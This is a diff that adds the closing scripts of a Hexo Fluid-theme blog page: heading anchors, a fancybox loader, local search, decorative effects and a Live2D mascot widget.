+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
